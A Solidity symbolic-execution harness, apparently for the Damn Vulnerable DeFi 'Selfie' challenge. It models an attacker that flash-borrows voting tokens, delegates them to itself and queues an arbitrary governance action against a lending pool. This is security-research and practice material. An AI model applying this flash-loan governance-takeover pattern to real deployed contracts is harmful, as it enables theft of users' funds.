// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";
import "forge-std/Test.sol";
import "lib/GlobalStorage.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";

contract SymbolicAttacker is Test, SymTest {
    // We can hardcode this address for convenience
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    bool is_preload = false;

    function execute_tx(string memory target_name) private {
        address target = svm.createAddress(target_name);
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic_optimized(target);
        target.call(data);
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        if (is_preload) {
            DamnValuableVotes(token).delegate(address(this));
            SimpleGovernance governance = SimpleGovernance(address(0xaaaa0004));
            address target = svm.createAddress("preload_onFlashLoan_target");
            uint256 value = svm.createUint256("preload_onFlashLoan_value");
            bytes memory data = svm.createBytes(1000, "preload_onFlashLoan_data");
            governance.queueAction(target, uint128(value), data);
        }
        else {
            execute_tx("onFlashLoan_target");
        }
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function preload(SelfiePool pool, DamnValuableVotes token) public {
        is_preload = true;
        bytes memory data = svm.createBytes(1000, "preload_data");
        uint256 amount = svm.createUint256("preload_amount");
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
        is_preload = false;
    }

    function attack() public {
        execute_tx("attack_target");
        /*uint256 warp = svm.createUint256("warp");
        vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
        execute_tx();
        warp = svm.createUint256("warp");
        vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
        execute_tx();*/
    }
}